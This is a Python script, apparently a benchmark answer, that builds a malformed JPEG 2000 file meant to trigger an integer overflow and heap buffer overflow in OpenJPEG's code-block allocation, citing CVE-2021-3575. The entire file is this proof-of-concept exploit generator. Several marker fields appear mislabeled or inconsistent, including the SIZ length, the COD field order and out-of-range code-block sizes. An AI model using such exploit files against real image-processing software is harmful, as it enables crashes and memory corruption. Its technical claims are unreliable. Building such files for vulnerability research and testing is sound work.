import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a crafted J2K (JPEG 2000) file that causes an integer
        overflow when calculating the buffer size for a code-block in the
        High-Throughput (HT) decoding path. This triggers a heap buffer
        overflow in the opj_t1_allocate_buffers function.

        The vulnerability (CVE-2021-3575) is triggered by setting code-block
        dimensions w=2^15 and h=2^15. The product w * h * sizeof(int)
        overflows a 32-bit integer, leading to a tiny allocation followed
        by an out-of-bounds write.
        """
        poc = bytearray()

        # SOC - Start of Codestream
        poc.extend(b'\xff\x4f')

        # SIZ - Image and tile size marker
        # We set image and tile dimensions large enough to contain the malicious code-block.
        poc.extend(b'\xff\x51')                # SIZ marker
        poc.extend(b'\x00\x27')                # Lsiz (length) = 39 bytes
        poc.extend(b'\x00\x00')                # Rsiz (capabilities)
        poc.extend(struct.pack('>I', 32768))   # Xsiz (image width)
        poc.extend(struct.pack('>I', 32768))   # Ysiz (image height)
        poc.extend(b'\x00\x00\x00\x00')        # XOsiz (x offset)
        poc.extend(b'\x00\x00\x00\x00')        # YOsiz (y offset)
        poc.extend(struct.pack('>I', 32768))   # XTsiz (tile width)
        poc.extend(struct.pack('>I', 32768))   # YTsiz (tile height)
        poc.extend(b'\x00\x00\x00\x00')        # XTOsiz (tile x offset)
        poc.extend(b'\x00\x00\x00\x00')        # YTOsiz (tile y offset)
        poc.extend(b'\x00\x01')                # Csiz (number of components)
        poc.extend(b'\x07')                    # Ssiz_0 (8-bit unsigned)
        poc.extend(b'\x01')                    # XRsiz_0 (subsampling)
        poc.extend(b'\x01')                    # YRsiz_0 (subsampling)

        # COD - Coding style default marker
        poc.extend(b'\xff\x52')                # COD marker
        poc.extend(b'\x00\x08')                # Lcod (length) = 8 bytes
        # Scod: Bit 0 (precincts) = 1, Bit 5 (HT) = 1 -> 0x21
        poc.extend(b'\x21')
        poc.extend(b'\x00\x00\x00\x01')        # SGcod (1 decomposition level)
        # SPcod: Cblks (0xDD) -> cblkh=13, cblkw=13 -> h=2^15, w=2^15
        poc.extend(b'\xdd')
        poc.extend(b'\x00')                    # Xform (9-7 irreversible)
        # Psize: Ppx=15, Ppy=15 -> 0xFF to avoid clamping code-block size
        poc.extend(b'\xff')

        # QCD - Quantization default marker
        poc.extend(b'\xff\x5c')                # QCD marker
        poc.extend(b'\x00\x03')                # Lqcd (length) = 3 bytes
        # Sqcd=0 (no quant) implies a 2-byte SPqcd field, which we set to zero.
        poc.extend(b'\x00\x00\x00')            # Sqcd + SPqcd

        # SOT - Start of tile-part marker
        poc.extend(b'\xff\x90')                # SOT marker
        poc.extend(b'\x00\x0a')                # Lsot (length) = 10 bytes
        poc.extend(b'\x00\x00')                # Isot (tile index)
        # Psot (tile-part length): 2 bytes for the SOD marker, no actual data
        poc.extend(b'\x00\x00\x00\x02')
        poc.extend(b'\x00')                    # TPsot (tile-part index)
        poc.extend(b'\x01')                    # TNsot (number of tile-parts)

        # SOD - Start of data marker
        # The overflow happens before data processing, so no data is needed.
        poc.extend(b'\xff\x93')

        # EOC - End of codestream marker
        poc.extend(b'\xff\xd9')

        return bytes(poc)